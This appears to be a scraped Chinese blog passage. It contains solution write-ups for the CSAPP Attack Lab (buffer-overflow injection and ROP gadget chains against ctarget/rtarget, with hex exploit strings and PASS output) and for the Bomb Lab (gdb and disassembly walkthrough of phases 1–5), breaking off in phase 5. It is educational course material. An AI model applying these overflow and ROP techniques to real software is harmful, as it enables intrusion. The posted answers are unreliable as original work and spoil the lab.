.text: 0000000000000000 \u0026lt;.text\u0026gt;: 0: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi 7: 68 fa 18 40 00 pushq $0x4018fa c: c3 retq 查看man ascii将cookie 59b997fa 转换为16进制：35 39 62 39 39 37 66 61\n输入文件：\n48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 执行命令，查看结果\n$ ./hex2raw -i ctarget.l3.txt | ./ctarget -q Cookie: 0x59b997fa Type string:Touch3!: You called touch3(\u0026quot;59b997fa\u0026quot;) Valid solution for level 3 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 Part II: Return-Oriented Programming 在ROP攻击中设置了栈随机化，所以我们不能像前面三个一样定位到精确地址插入代码。为了实现攻击，我们要在已经给定的代码中找到特定的指令序列，这些序列以ret结尾，我们把这些命令叫做gadget.\nlevel 2 For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the first eight x86-64 registers (%rax–%rdi).\nSome Advice:\nAll the gadgets you need can be found in the region of the code for rtarget demarcated by the functions start_farm and mid_farm. You can do this attack with just two gadgets. When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data. 这个跟上面的ctargetlevel 2要求差不多，都是调用touch2，只不过这里要求在rtarget。根据第一点提示，所有用到的 gadgets在start_farm与mid_farm之间找。所以先将farm.c转换成指令\n$ gcc -c -Og farm.c #这里 不加-Og 会采用 stack frame pointer，而rtarget没有用该指针 $ objdump -d farm.o \u0026gt; farm.asm $ cat farm.asm 0000000000000000 \u0026lt;start_farm\u0026gt;: 0: f3 0f 1e fa endbr64 4: b8 01 00 00 00 mov $0x1,%eax 9: c3 retq 000000000000000a \u0026lt;getval_142\u0026gt;: a: f3 0f 1e fa endbr64 e: b8 fb 78 90 90 mov $0x909078fb,%eax 13: c3 retq 0000000000000014 \u0026lt;addval_273\u0026gt;: 14: f3 0f 1e fa endbr64 18: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 1e: c3 retq 000000000000001f \u0026lt;addval_219\u0026gt;: 1f: f3 0f 1e fa endbr64 23: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 29: c3 retq 000000000000002a \u0026lt;setval_237\u0026gt;: 2a: f3 0f 1e fa endbr64 2e: c7 07 48 89 c7 c7 movl $0xc7c78948,(%rdi) 34: c3 retq 0000000000000035 \u0026lt;setval_424\u0026gt;: 35: f3 0f 1e fa endbr64 39: c7 07 54 c2 58 92 movl $0x9258c254,(%rdi) 3f: c3 retq 0000000000000040 \u0026lt;setval_470\u0026gt;: 40: f3 0f 1e fa endbr64 44: c7 07 63 48 8d c7 movl $0xc78d4863,(%rdi) 4a: c3 retq 000000000000004b \u0026lt;setval_426\u0026gt;: 4b: f3 0f 1e fa endbr64 4f: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 55: c3 retq 0000000000000056 \u0026lt;getval_280\u0026gt;: 56: f3 0f 1e fa endbr64 5a: b8 29 58 90 c3 mov $0xc3905829,%eax 5f: c3 retq 0000000000000056 \u0026lt;getval_280\u0026gt;: 56: f3 0f 1e fa endbr64 5a: b8 29 58 90 c3 mov $0xc3905829,%eax 5f: c3 retq 0000000000000060 \u0026lt;mid_farm\u0026gt;: 60: f3 0f 1e fa endbr64 64: b8 01 00 00 00 mov $0x1,%eax 69: c3 retq 根据提示，只需要其中的两个，而我们大致的思路可以将cookie放到%rdi，把touch2的地址放到栈中，以ret执行。那么需要一个mov 跟 popq指令。\npop会把栈顶的cookie弹出到另外一个寄存器，再用mov命令写到%rdi里。\n下面是mov和pop的字节编码表：\n我们想要的代码：\npopq %rax #将栈顶8个字节内存储的值赋值给rax寄存器，并将栈顶指针向上移动八个字节 movq %rax,%rdi 在上表找 popq %rax对应的指令是 58，movq %rax,%rdi对应的指令是 48 89 c7。因为farm.c里边的函数已经整合进rtarget了，所以回到rtarget.asm中找，找到这两个：\n00000000004019a0 \u0026lt;addval_273\u0026gt;: 4019a0:\t8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6:\tc3 retq 00000000004019a7 \u0026lt;addval_219\u0026gt;: 4019a7:\t8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad:\tc3 retq 由上面的代码中可以看到，pop开始的地址为4019ab，mov开始的地址为4019a2\n查看touch2地址为\n0x4017ec 所以我们输入的内容到rtarget.l2.txt为:\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00 结果：\n$ ./hex2raw -i rtarget.l2.txt | ./rtarget -q Cookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target rtarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 level 3 Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.\nTo solve Phase 5, you can use gadgets in the region of the code in rtarget demarcated by functions start_farm and end_farm. In addition to the gadgets used in Phase 4, this expanded farm includes the encodings of different movl instructions, as shown in Figure 3C. The byte sequences in this part of the farm also contain 2-byte instructions that serve as functional nops, i.e., they do not change any register or memory values. These include instructions, shown in Figure 3D, such as andb %al,%al, that operate on the low-order bytes of some of the registers but do not change their values.\nSome Advice:\nYou’ll want to review the effect a movl instruction has on the upper 4 bytes of a register, as is described on page 183 of the text. The official solution requires eight gadgets (not all of which are unique). 这里我们需要做的就是将字符串的起始地址，传送到 %rdi然后调用touch3函数。但是因为每次栈的位置都是随机的，无法直接用地址来找到字符串的位置，所以我们只能通过栈顶+偏移量来代替原来的方案。从farm中找不到add相关的指令，但是找到了lea (%rdi,%rsi,1),%rax代替 add\n具体操作：\n将栈顶地址 %rsp 赋值给 %rdi 将偏移量bias 赋值给 %rsi 将栈顶+偏移量放到%rdi 调用touch3 这里的偏移量是，返回地址与字符串首地址之间有9条指令，每个指令8个byte，一共72字节，72=0x48。\n这里不能直接 mov %rax %rsi，因为farm中没有这条指令。\n分别找到这些指令的起始地址:\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 cc 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 70 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 输出到rtarget.l3.txt，执行查看结果\n$ ./hex2raw -i rtarget.l3.txt | ./rtarget -q Cookie: 0x59b997fa Type string:Touch3!: You called touch3(\u0026quot;59b997fa\u0026quot;) Valid solution for level 3 with target rtarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 成功！\n总结 这次实验对gdb等工具的使用有了更进一步的了解，除此之外对，这种缓冲区溢出带来的漏洞认识更深了，最深刻的就是对栈上面的内容排布等很熟悉了。\n","id":6,"section":"posts","summary":"CSAPP\u0026ndash;Attack Lab实验记录 前言 这个实验是csapp lab系列的第三个实验，实验内容主要是通过一些“攻击”手段，让我们了解缓冲区溢出隐患以及如何利用缓冲","tags":["csapp-lab","汇编"],"title":"CSAPP--Attack Lab实验记录","uri":"https://lincx-911.github.io/2021/12/attack_lab/","year":"2021"},{"content":"CSAPP\u0026ndash;Bomb Lab实验记录 前言 本实验是《深入理解计算机系统》一书中的附带实验——二进制炸弹实验。二进制炸弹是一个作为目标代码文件提供给学生们的程序。运行时，它提示用户输入6个不同的字符串。如果其中的任何一个不正确，炸弹就会“爆炸”，打印出一条错误信息，并且在一个分级服务器上记录事件日志。学生们必须通过对程序反汇编和逆向工程来测定应该是哪6个串，从而解除他们各自炸弹的雷管。 该实验教会学生理解汇编语言，并且强制他们学习怎么使用调试器。\n一、实验准备 1.1 配置实验环境 linux 环境（ubuntu） gdb（调试程序使用） 1.2 实验必备知识 汇编语法 gdb基本指令使用 1.3 实验资源 实验官网 下载 Self-Study Handout\n或者\nGithub 这是其他人的，有自己的实验记录\n二、实验内容 1. phase_1 将bomb程序 反编译 得到汇编代码，放到bomb.ams文件中\n$ objdump -d bomb \u0026gt; bomb.asm 使用编辑器（vscode)打开bomb.ams文件,定位到 main函数在的地方，找到phase_1函数的地址 400ee0。这行前面的可以对着看 bomb.c文件对应的代码。\n0000000000400da0 \u0026lt;main\u0026gt;: 400da0:\t53 push %rbx 400da1:\t83 ff 01 cmp $0x1,%edi ...... \u0026lt;read_line\u0026gt; 400e37:\t48 89 c7 mov %rax,%rdi 400e3a:\te8 a1 00 00 00 callq 400ee0 \u0026lt;phase_1\u0026gt; 400e3f:\te8 80 07 00 00 callq 4015c4 ...... 然后 搜索 400ee0的位置，得到 phase_1函数的汇编代码\n0000000000400ee0 \u0026lt;phase_1\u0026gt;: 400ee0:\t48 83 ec 08 sub $0x8,%rsp # 栈指针减去8（分配空间） 400ee4:\tbe 00 24 40 00 mov $0x402400,%esi # 将0x402400作为参数传入 400ee9:\te8 4a 04 00 00 callq 401338 \u0026lt;strings_not_equal\u0026gt; #调用该方法 400eee:\t85 c0 test %eax,%eax # 比较返回值 400ef0:\t74 05 je 400ef7 \u0026lt;phase_1+0x17\u0026gt; 400ef2:\te8 43 05 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; # 如果返回值不为0，爆炸 400ef7:\t48 83 c4 08 add $0x8,%rsp 400efb:\tc3 retq 其实从\u0026lt;strings_not_equal\u0026gt; 可以大致猜到这个函数是字符串比较的函数，为了验证猜想是否正确，我们继续跳到这个函数地址401338看看\n0000000000401338 \u0026lt;strings_not_equal\u0026gt;: 401338:\t41 54 push %r12 40133a:\t55 push %rbp 40133b:\t53 push %rbx 40133c:\t48 89 fb mov %rdi,%rbx 40133f:\t48 89 f5 mov %rsi,%rbp 401342:\te8 d4 ff ff ff callq 40131b \u0026lt;string_length\u0026gt; 401347:\t41 89 c4 mov %eax,%r12d 40134a:\t48 89 ef mov %rbp,%rdi 40134d:\te8 c9 ff ff ff callq 40131b \u0026lt;string_length\u0026gt; 401352:\tba 01 00 00 00 mov $0x1,%edx 401357:\t41 39 c4 cmp %eax,%r12d 40135a:\t75 3f jne 40139b \u0026lt;strings_not_equal+0x63\u0026gt; 40135c:\t0f b6 03 movzbl (%rbx),%eax 40135f:\t84 c0 test %al,%al 401361:\t74 25 je 401388 \u0026lt;strings_not_equal+0x50\u0026gt; 401363:\t3a 45 00 cmp 0x0(%rbp),%al 401366:\t74 0a je 401372 \u0026lt;strings_not_equal+0x3a\u0026gt; 401368:\teb 25 jmp 40138f \u0026lt;strings_not_equal+0x57\u0026gt; 40136a:\t3a 45 00 cmp 0x0(%rbp),%al 40136d:\t0f 1f 00 nopl (%rax) 401370:\t75 24 jne 401396 \u0026lt;strings_not_equal+0x5e\u0026gt; 401372:\t48 83 c3 01 add $0x1,%rbx 401376:\t48 83 c5 01 add $0x1,%rbp 40137a:\t0f b6 03 movzbl (%rbx),%eax 40137d:\t84 c0 test %al,%al 40137f:\t75 e9 jne 40136a \u0026lt;strings_not_equal+0x32\u0026gt; 401381:\tba 00 00 00 00 mov $0x0,%edx 401386:\teb 13 jmp 40139b \u0026lt;strings_not_equal+0x63\u0026gt; 401388:\tba 00 00 00 00 mov $0x0,%edx 40138d:\teb 0c jmp 40139b \u0026lt;strings_not_equal+0x63\u0026gt; 40138f:\tba 01 00 00 00 mov $0x1,%edx 401394:\teb 05 jmp 40139b \u0026lt;strings_not_equal+0x63\u0026gt; 401396:\tba 01 00 00 00 mov $0x1,%edx 40139b:\t89 d0 mov %edx,%eax 40139d:\t5b pop %rbx 40139e:\t5d pop %rbp 40139f:\t41 5c pop %r12 4013a1:\tc3 retq 可以看到，这个strings_not_equal函数接收两个参数，然后接下来就是比较这两个参数的长度是否相等，若相等则继续比较每个位置对应的字符是否相同，最后返回结果\n那现在phase_1函数的内容很明显了，就是比较我们输入的字符串与0x402400这个位置的字符串是否相等，不相等就会bomb\n接下来我们看看0x402400这个位置究竟存了什么内容。\n首先gdb调试bomb程序 在这个phase_1函数设置断点 输出这个位置的内容 $ gdb bomb For help, type \u0026quot;help\u0026quot;. Type \u0026quot;apropos word\u0026quot; to search for commands related to \u0026quot;word\u0026quot;... Reading symbols from bomb... (gdb) b *0x400ee4 Breakpoint 1 at 0x400ee4 (gdb) run Starting program: /home/lincx/文档/CSAPP-Labs-master/labs/source/bomb/bomb Welcome to my fiendish little bomb. You have 6 phases with which to blow yourself up. Have a nice day! asd Breakpoint 1, 0x0000000000400ee4 in phase_1 () (gdb) x/s 0x402400 0x402400:\t\u0026quot;Border relations with Canada have never been better.\u0026quot; (gdb) 其中 b*0x400ee4表示设置断点，x/s 0x402400表示输出该位置的内容为字符串形式。 可以看到内容是 \u0026ldquo;Border relations with Canada have never been better.\u0026rdquo; 这也是我们需要找的答案了。\n2. phase_2 首先也是在bomb.asm文件中，定位到phase_2的位置，然后逐句分析\n0000000000400efc \u0026lt;phase_2\u0026gt;: 400efc:\t55 push %rbp #栈帧 400efd:\t53 push %rbx #栈帧 400efe:\t48 83 ec 28 sub $0x28,%rsp #栈指针减40 400f02:\t48 89 e6 mov %rsp,%rsi # 将栈指针作为第二个参数 400f05:\te8 52 05 00 00 callq 40145c \u0026lt;read_six_numbers\u0026gt; #调用函数 400f0a:\t83 3c 24 01 cmpl $0x1,(%rsp) # 栈指针内存位置的内容与1比较 400f0e:\t74 20 je 400f30 \u0026lt;phase_2+0x34\u0026gt; # 相等跳到 400f30 400f10:\te8 25 05 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; # 不相等就会爆炸 400f15:\teb 19 jmp 400f30 \u0026lt;phase_2+0x34\u0026gt; # 跳到400f30 400f17:\t8b 43 fc mov -0x4(%rbx),%eax # 将 %rbx-0x4 内存位置的内容 赋值给%eax 400f1a:\t01 c0 add %eax,%eax # %eax = %eax+%eax 相当于 乘2 400f1c:\t39 03 cmp %eax,(%rbx) # 比较 %eax与（%rbx） 400f1e:\t74 05 je 400f25 \u0026lt;phase_2+0x29\u0026gt; #相等就跳到 400f25 400f20:\te8 15 05 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; #不相等就会爆炸 400f25:\t48 83 c3 04 add $0x4,%rbx # %rbx+0x4 400f29:\t48 39 eb cmp %rbp,%rbx # 比较%rbp 与 %rbx 400f2c:\t75 e9 jne 400f17 \u0026lt;phase_2+0x1b\u0026gt; #不相等就跳到400f17（是不是有点像循环） 400f2e:\teb 0c jmp 400f3c \u0026lt;phase_2+0x40\u0026gt; # 跳到400f3c 400f30:\t48 8d 5c 24 04 lea 0x4(%rsp),%rbx # 栈指针+4后赋值给%rbx 400f35:\t48 8d 6c 24 18 lea 0x18(%rsp),%rbp # 栈指针+24后赋值给%rbp 400f3a:\teb db jmp 400f17 \u0026lt;phase_2+0x1b\u0026gt; #跳到400f17 400f3c:\t48 83 c4 28 add $0x28,%rsp #可以理解为释放栈？ 400f40:\t5b pop %rbx 400f41:\t5d pop %rbp 400f42:\tc3 retq 分析完后，会发现，这个函数的功能是比较我们输入的6个数是否为等比数列，从 cmpl $0x1,(%rsp)可以看出，最先开始的值为1，然后add %eax,%eax这个表示，等比数列的比值为2，由此可以推出我们需要输入的六个数字为\n1 2 4 8 16 32 3. phase_3 首先也是在bomb.asm文件中，定位到phase_3的位置，然后逐句分析\n0000000000400f43 \u0026lt;phase_3\u0026gt;: 400f43:\t48 83 ec 18 sub $0x18,%rsp #栈帧相关 400f47:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx # 将栈指针地址赋值给 %rcx 400f4c:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx # 将栈指针地址+0x8 赋值给 %rdx 400f51:\tbe cf 25 40 00 mov $0x4025cf,%esi # 将0x4025cf的内容赋值给%esi 400f56:\tb8 00 00 00 00 mov $0x0,%eax #将0赋值给 %eax 400f5b:\te8 90 fc ff ff callq 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 400f60:\t83 f8 01 cmp $0x1,%eax #比较1 与 %eax的内容 400f63:\t7f 05 jg 400f6a \u0026lt;phase_3+0x27\u0026gt; #大于1 则跳到 400f6a 400f65:\te8 d0 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; # 否则爆炸 400f6a:\t83 7c 24 08 07 cmpl $0x7,0x8(%rsp) # 比较 （%rsp+8）与 7 400f6f:\t77 3c ja 400fad \u0026lt;phase_3+0x6a\u0026gt; # 大于则跳转400fad，爆炸 400f71:\t8b 44 24 08 mov 0x8(%rsp),%eax # 将（%rsp+8） 赋值给 %eax，也就是第一个 400f75:\tff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) #并跳转至%rax*8+0x402470的内存保存的地址上 400f7c:\tb8 cf 00 00 00 mov $0xcf,%eax 400f81:\teb 3b jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f83:\tb8 c3 02 00 00 mov $0x2c3,%eax 400f88:\teb 34 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f8a:\tb8 00 01 00 00 mov $0x100,%eax 400f8f:\teb 2d jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f91:\tb8 85 01 00 00 mov $0x185,%eax 400f96:\teb 26 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f98:\tb8 ce 00 00 00 mov $0xce,%eax 400f9d:\teb 1f jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f9f:\tb8 aa 02 00 00 mov $0x2aa,%eax 400fa4:\teb 18 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fa6:\tb8 47 01 00 00 mov $0x147,%eax 400fab:\teb 11 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fad:\te8 88 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 400fb2:\tb8 00 00 00 00 mov $0x0,%eax 400fb7:\teb 05 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fb9:\tb8 37 01 00 00 mov $0x137,%eax 400fbe:\t3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2:\t74 05 je 400fc9 \u0026lt;phase_3+0x86\u0026gt; 400fc4:\te8 71 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 400fc9:\t48 83 c4 18 add $0x18,%rsp 400fcd:\tc3 retq 分析到jmpq *0x402470(,%rax,8)这一步，就得停下来看看，这个跳转的内容了。而且前面mov $0x4025cf,%esi这个也需要看看其中的内容是什么。\n$ gdb bomb ...... (gdb) x/s 0x4025cf 0x4025cf:\t\u0026quot;%d %d\u0026quot; 可以看到 0x4025cf这个地址的内容是两个整数，再看到下面有scanf函数，可以推测我们需要输入两个整数。 栈顶 %rsp 的前 8 位存的是函数的返回地址所在栈地址，从 8(%rsp)开始存第一个参数。由cmpl $0x7,0x8(%rsp)这一步可以看到，第一个数需要比7小才不会爆炸。所以有 0～7可以选择。\n接着 看看*0x402470(,%rax,8),这个可以看作是 %rax*8+0x402470。已经把第一个参数传到 %eax 里，x86-64规定低位四字节作整体传的时候，高四字节置 0 。把 0x402470里的东西输出看一下：\n(gdb) x/8a 0x402470 0x402470:\t0x400f7c \u0026lt;phase_3+57\u0026gt;\t0x400fb9 \u0026lt;phase_3+118\u0026gt; 0x402480:\t0x400f83 \u0026lt;phase_3+64\u0026gt;\t0x400f8a \u0026lt;phase_3+71\u0026gt; 0x402490:\t0x400f91 \u0026lt;phase_3+78\u0026gt;\t0x400f98 \u0026lt;phase_3+85\u0026gt; 0x4024a0:\t0x400f9f \u0026lt;phase_3+92\u0026gt;\t0x400fa6 \u0026lt;phase_3+99\u0026gt; 可以看到出现了八个地址，分别对应这上面未分析的汇编代码的八个地址，有点像switch,再往下跳转，cmp 0xc(%rsp),%eax,也就是说第二个参数只要是跟其中一个相等，就会避开炸弹。 列出这八个数，以及对应的第一个参数。\n十六进制 十进制 第一个参数 0xcf 207 0 0x2c3 707 2 0x100 256 3 0x185 389 4 0xce 206 5 0x2aa 682 6 0x147 327 7 0x137 311 1 所以，第一个参数可以从 0～7选择，第二个参数是它对应的十进制数。验证\n1 311 Halfway there! 成功！\n4. phase_4 可以看到phase_4前面的部分，跟phase_3很相似，都是输入两个参数。接着还是逐句分析。\n0000000000400fce \u0026lt;func4\u0026gt;: 400fce:\t48 83 ec 08 sub $0x8,%rsp 400fd2:\t89 d0 mov %edx,%eax 400fd4:\t29 f0 sub %esi,%eax 400fd6:\t89 c1 mov %eax,%ecx 400fd8:\tc1 e9 1f shr $0x1f,%ecx #逻辑右移31位 400fdb:\t01 c8 add %ecx,%eax 400fdd:\td1 f8 sar %eax 400fdf:\t8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2:\t39 f9 cmp %edi,%ecx 400fe4:\t7e 0c jle 400ff2 \u0026lt;func4+0x24\u0026gt; 400fe6:\t8d 51 ff lea -0x1(%rcx),%edx 400fe9:\te8 e0 ff ff ff callq 400fce \u0026lt;func4\u0026gt; 400fee:\t01 c0 add %eax,%eax 400ff0:\teb 15 jmp 401007 \u0026lt;func4+0x39\u0026gt; 400ff2:\tb8 00 00 00 00 mov $0x0,%eax 400ff7:\t39 f9 cmp %edi,%ecx 400ff9:\t7d 0c jge 401007 \u0026lt;func4+0x39\u0026gt; 400ffb:\t8d 71 01 lea 0x1(%rcx),%esi 400ffe:\te8 cb ff ff ff callq 400fce \u0026lt;func4\u0026gt; 401003:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007:\t48 83 c4 08 add $0x8,%rsp 40100b:\tc3 retq 000000000040100c \u0026lt;phase_4\u0026gt;: 40100c:\t48 83 ec 18 sub $0x18,%rsp 401010:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a:\tbe cf 25 40 00 mov $0x4025cf,%esi 40101f:\tb8 00 00 00 00 mov $0x0,%eax 401024:\te8 c7 fb ff ff callq 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 401029:\t83 f8 02 cmp $0x2,%eax 40102c:\t75 07 jne 401035 \u0026lt;phase_4+0x29\u0026gt; 40102e:\t83 7c 24 08 0e cmpl $0xe,0x8(%rsp) #比较输入的第一个参数与 0xe 401033:\t76 05 jbe 40103a \u0026lt;phase_4+0x2e\u0026gt; #\u0026lt;= 跳转 401035:\te8 00 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 40103a:\tba 0e 00 00 00 mov $0xe,%edx #第三个参数设为 0xe 40103f:\tbe 00 00 00 00 mov $0x0,%esi #第二个参数设为 0x0 401044:\t8b 7c 24 08 mov 0x8(%rsp),%edi 第一个参数为输入的第一个数 401048:\te8 81 ff ff ff callq 400fce \u0026lt;func4\u0026gt; 40104d:\t85 c0 test %eax,%eax #判断返回值正负 40104f:\t75 07 jne 401058 \u0026lt;phase_4+0x4c\u0026gt; #非0跳转爆炸 401051:\t83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) #比较输入的第二个参数 401056:\t74 05 je 40105d \u0026lt;phase_4+0x51\u0026gt; #相等则跳过爆炸 401058:\te8 dd 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 40105d:\t48 83 c4 18 add $0x18,%rsp 401061:\tc3 retq 由分析可知，当调用func4返回值为0的时候，才能不触发炸弹。所以接着分析func4。 为了方便分析，将func4 翻译成c 语言代码：\nint func4(int x,int y,int z){ int res = z-y; int tmp = res\u0026gt;\u0026gt;31; res= (res+tmp)\u0026gt;\u0026gt;1; tmp = res+y; if(x\u0026gt;tmp){ z = tmp-1; res=func4(x,y,z); res+=res; return res; }else{ res=0; if(x\u0026gt;=tmp){ /*目标*/ return res; } y=tmp+1; res=func4(x,y,z); res = res*res+1; return res; } } 可以看到 当x\u0026gt;=tmp的时候，函数会返回我们预期的0。 由上边分析可知道，函数func4的三个参数分别为 x(我们输入的第一个参数)、0、14。代入上边代码，可以得到tmp=7（第一次）所以，当x=7的时候，就刚好可以满足这个条件。所以暂时确定第一个数为 7.\n往下继续分析 cmpl $0x0,0xc(%rsp) 这一句就表明了，第二个输入的参数为 0\n最终答案为：\n7 0 So you got that one. Try this one. 5. phase_5 On x86_64, segmented addressing is no longer used, but the both the FS and GS registers can be used as base-pointer addresses in order to access special operating system data-structures. So what you\u0026rsquo;re seeing is a value loaded at an offset from the value held in the FS register, and not bit manipulation of the contents of the FS register. Specifically what\u0026rsquo;s taking place, is that FS:0x28 on Linux is storing a special sentinel stack-guard value, and the code is performing a stack-guard check. For instance, if you look further in your code, you\u0026rsquo;ll see that the value at FS:0x28 is stored on the stack, and then the contents of the stack are recalled and an XOR is performed with the original value at FS:0x28. If the two values are equal, which means that the zero-bit has been set because XOR\u0026rsquo;ing two of the same values results in a zero-value, then we jump to the test routine, otherwise we jump to a special function that indicates that the stack was somehow corrupted, and the sentinel value stored on the stack was changed. 在 x86_64 上，不再使用分段寻址，但 FS 和 GS 寄存器都可以用作基址指针地址，以便访问特殊的操作系统数据结构。所以你看到的是一个加载的值与 FS 寄存器中保存的值有一个偏移量，而不是对 FS 寄存器内容的位操作。 具体发生的事情是，Linux 上的 FS:0x28 正在存储一个特殊的哨兵堆栈保护值，并且代码正在执行堆栈保护检查。例如，如果您进一步查看代码，您会看到 FS:0x28 处的值存储在堆栈中，然后调用堆栈中的内容并与 FS:0x28 处的原始值执行 XOR .如果两个值相等，这意味着已经设置了零位，因为对两个相同的值进行异或会产生一个零值，那么我们跳转到测试例程，否则我们跳转到一个特殊的函数，表明堆栈以某种方式损坏，并且存储在堆栈中的标记值已更改。\n上面是自己查了一下%fs:0x28指令的用法。\n下面开始解题。\n老方法，逐句分析\n0000000000401062 \u0026lt;phase_5\u0026gt;: 401062:\t53 push %rbx 401063:\t48 83 ec 20 sub $0x20,%rsp 401067:\t48 89 fb mov %rdi,%rbx # 将输入的参数1赋值给 %rbx 40106a:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401071:\t00 00 401073:\t48 89 44 24 18 mov %rax,0x18(%rsp) #作为一个栈保护值 401078:\t31 c0 xor %eax,%eax #异或 置零 40107a:\te8 9c 02 00 00 callq 40131b \u0026lt;string_length\u0026gt; #调用函数计算字符串长度 40107f:\t83 f8 06 cmp $0x6,%eax 401082:\t74 4e je 4010d2 \u0026lt;phase_5+0x70\u0026gt; #输入的字符串长度等于6，继续 401084:\te8 b1 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt;#否则，爆炸 401089:\teb 47 jmp 4010d2 \u0026lt;phase_5+0x70\u0026gt; 40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f:\t88 0c 24 mov %cl,(%rsp) 401092:\t48 8b 14 24 mov (%rsp),%rdx 401096:\t83 e2 0f and $0xf,%edx 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4:\t48 83 c0 01 add $0x1,%rax 4010a8:\t48 83 f8 06 cmp $0x6,%rax 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt; 4010ae:\tc6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3:\tbe 5e 24 40 00 mov $0x40245e,%esi 4010b8:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd:\te8 76 02 00 00 callq 401338 \u0026lt;strings_not_equal\u0026gt; 4010c2:\t85 c0 test %eax,%eax 4010c4:\t74 13 je 4010d9 \u0026lt;phase_5+0x77\u0026gt; 4010c6:\te8 6f 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 4010cb:\t0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0:\teb 07 jmp 4010d9 \u0026lt;phase_5+0x77\u0026gt; 4010d2:\tb8 00 00 00 00 mov $0x0,%eax 